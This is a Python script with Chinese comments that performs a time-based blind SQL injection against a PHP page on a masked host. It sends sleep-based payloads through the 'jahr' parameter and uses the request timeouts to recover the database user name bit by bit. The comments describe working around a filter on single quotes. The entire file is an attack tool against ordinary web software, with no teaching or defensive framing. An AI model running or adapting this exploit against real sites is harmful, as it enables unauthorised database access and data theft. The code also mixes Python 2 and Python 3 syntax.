# encoding:utf-8
#本次url中不能存在单引号，所以转换为ascii进行时间盲注，还有一种方法是建立ascii字典表，通过【select 't'=0x】
import requests


length=14  #长度


def hex_ascii(sss):		#8位二进制字符转换为ascii字符
	a=0
	for x in range(8):
		if int(sss[7-x])==1:
			a=a+2**x
	return chr(a)

def main():
	sti=''
	for x in range(length):
		hex=''
		for y in range(7):
			url1='http://xxx.xxxxxxxx.xxx/xampp/cds.php?interpret=1&jahr=if(mid(lpad(bin(ord(substr(user(),'+str(x+1)+',1))),8,0),'+str(y+2)+',1)=1,sleep(6),sleep(2))&titel=222'
			try:
				response = requests.get(url1,timeout=5)
				hex=hex+'0'		#有可能出错,看来是没错，能正常运行。
				#print(hex)
			except requests.exceptions.RequestException as e:
				hex=hex+'1'
				#print(hex)
		hex='0'+hex
		print(hex)
		#print()
		sti=sti+hex_ascii(hex)
		print sti
	print sti
	
if __name__ == '__main__':
	main()

